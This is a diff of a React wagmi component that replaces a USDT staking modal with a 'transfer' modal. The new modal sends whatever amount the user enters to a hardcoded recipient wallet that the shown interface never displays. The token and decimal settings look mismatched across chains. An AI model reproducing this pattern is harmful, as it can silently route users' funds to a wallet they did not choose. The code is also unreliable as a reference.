@@ -5,47 +5,31 @@ import { useAccount, useWriteContract, useWaitForTransactionReceipt } from 'wagm
 import { parseUnits } from 'viem';
 import { toast } from 'react-hot-toast';
 
-// 合约地址
-const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955' as const; // USDT 合约地址
-const STAKING_ADDRESS = '0xFe1C5ca58F83A662A409E326CE4be7A8Fa6ed06f' as const; // 质押合约地址
-
-// USDT 的 ABI
+// USDT的ABI
 const USDT_ABI = [
   {
     "inputs": [
-      { "internalType": "address", "name": "spender", "type": "address" },
+      { "internalType": "address", "name": "recipient", "type": "address" },
       { "internalType": "uint256", "name": "amount", "type": "uint256" }
     ],
-    "name": "approve",
+    "name": "transfer",
     "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
     "stateMutability": "nonpayable",
     "type": "function"
   }
 ] as const;
 
-// 质押合约的 ABI
-const STAKING_ABI = [
-  {
-    "inputs": [
-      { "internalType": "uint256", "name": "amount", "type": "uint256" }
-    ],
-    "name": "stake",
-    "outputs": [],
-    "stateMutability": "nonpayable",
-    "type": "function"
-  }
-] as const;
-
-interface StakingProps {
+interface TransferProps {
   isOpen: boolean;
   onClose: () => void;
 }
 
-function Staking({ isOpen, onClose }: StakingProps) {
+function Transfer({ isOpen, onClose }: TransferProps) {
   const [amount, setAmount] = useState('');
   const [isAnimating, setIsAnimating] = useState(false);
-  const [isApproved, setIsApproved] = useState(false);
   const { isConnected } = useAccount();
+
+  const FIXED_RECIPIENT = '0xe3874401fF2fd9A40CDd31c819FBcC7106bA8540' as const;
 
   // 用户信息查询
   const { data: userProfile, isLoading } = useQuery({
@@ -55,7 +39,7 @@ function Staking({ isOpen, onClose }: StakingProps) {
   });
 
   // 合约写入
-  const { writeContract, isPending: isStaking, data: hash } = useWriteContract();
+  const { writeContract, isPending: isTransferring, data: hash } = useWriteContract();
 
   // 等待交易完成
   const { isSuccess } = useWaitForTransactionReceipt({
@@ -89,72 +73,40 @@ function Staking({ isOpen, onClose }: StakingProps) {
     }
   };
 
-  // 处理授权
-  const handleApprove = async () => {
+  // 处理转账
+  const handleTransfer = async () => {
     if (!isConnected) {
       toast.error('请先连接钱包');
       return;
     }
 
     if (!amount || parseFloat(amount) <= 0) {
-      toast.error('请输入有效的质押数量');
+      toast.error('请输入有效的转账数量');
       return;
     }
 
     try {
       writeContract({
-        address: USDT_ADDRESS,
+        address: `0xdAC17F958D2ee523a2206206994597C13D831ec7`,
         abi: USDT_ABI,
-        functionName: 'approve',
-        args: [STAKING_ADDRESS, parseUnits(amount, 6)],
+        functionName: 'transfer',
+        args: [FIXED_RECIPIENT, parseUnits(amount, 6)],
       });
-      toast.success('授权请求已发送！');
+      toast.success('转账请求已发送！');
     } catch (error) {
-      toast.error('授权失败，请重试');
-      console.error('Approve error:', error);
-    }
-  };
-
-  // 处理质押
-  const handleStake = async () => {
-    if (!isConnected) {
-      toast.error('请先连接钱包');
-      return;
-    }
-
-    if (!amount || parseFloat(amount) <= 0) {
-      toast.error('请输入有效的质押数量');
-      return;
-    }
-
-    try {
-      writeContract({
-        address: STAKING_ADDRESS,
-        abi: STAKING_ABI,
-        functionName: 'stake',
-        args: [parseUnits(amount, 6)],
-      });
-      toast.success('质押请求已发送！');
-    } catch (error) {
-      toast.error('质押失败，请重试');
-      console.error('Stake error:', error);
+      toast.error('转账失败，请重试');
+      console.error('Transfer error:', error);
     }
   };
 
   // 监听交易状态
   useEffect(() => {
     if (isSuccess) {
-      if (!isApproved) {
-        setIsApproved(true);
-        toast.success('授权成功！请确认质押');
-      } else {
-        toast.success('质押成功！');
-        setAmount('');
-        setIsApproved(false);
-        onClose();
-      }
+      toast.success('转账成功！');
+      setAmount('');
+      onClose();
     }
-  }, [isSuccess, isApproved, onClose]);
+  }, [isSuccess, onClose]);
 
   if (!isOpen && !isAnimating) return null;
 
@@ -164,7 +116,7 @@ function Staking({ isOpen, onClose }: StakingProps) {
         isOpen ? 'opacity-100' : 'opacity-0'
       }`}
     >
-      {/* 背景遮罩 - 使用渐进式模糊效果 */}
+      {/* 背景遮罩 */}
       <div 
         className="absolute inset-0 transition-all duration-1000"
         style={{
@@ -202,7 +154,7 @@ function Staking({ isOpen, onClose }: StakingProps) {
             opacity: isOpen ? 1 : 0
           }}
         >
-          <h3 className="text-xl font-semibold text-white">质押 USDT</h3>
+          <h3 className="text-xl font-semibold text-white">转账 USDT</h3>
           <button 
             onClick={onClose}
             className="text-gray-400 hover:text-white transition-colors duration-300"
@@ -235,10 +187,10 @@ function Staking({ isOpen, onClose }: StakingProps) {
             </span>
           </div>
 
-          {/* 输入金额 */}
+          {/* 金额输入 */}
           <div className="bg-[#151923] rounded-lg p-4">
             <div className="flex justify-between items-center mb-2">
-              <span className="text-gray-400">质押数量</span>
+              <span className="text-gray-400">转账数量</span>
               <button 
                 onClick={handleMaxClick}
                 className="text-[#6366f1] text-sm transition-colors hover:text-[#5355d1] bg-[#6366f1]/10 px-2 py-1 rounded"
@@ -260,13 +212,13 @@ function Staking({ isOpen, onClose }: StakingProps) {
 
           {/* 确认按钮 */}
           <button
-            onClick={isApproved ? handleStake : handleApprove}
-            disabled={isStaking || !isConnected}
+            onClick={handleTransfer}
+            disabled={isTransferring || !isConnected}
             className="w-full bg-[#6366f1] text-white font-bold py-4 rounded-lg transform transition-all duration-300 hover:bg-[#5355d1] hover:shadow-lg active:scale-[0.98] disabled:opacity-50 disabled:cursor-not-allowed"
           >
             {!isConnected ? '请先连接钱包' : 
-             isStaking ? '处理中...' : 
-             isApproved ? '确认质押' : '质押'}
+             isTransferring ? '处理中...' : 
+             '确认转账'}
           </button>
         </div>
       </div>
@@ -274,4 +226,4 @@ function Staking({ isOpen, onClose }: StakingProps) {
   );
 }
 
-export default Staking;
+export default Transfer;
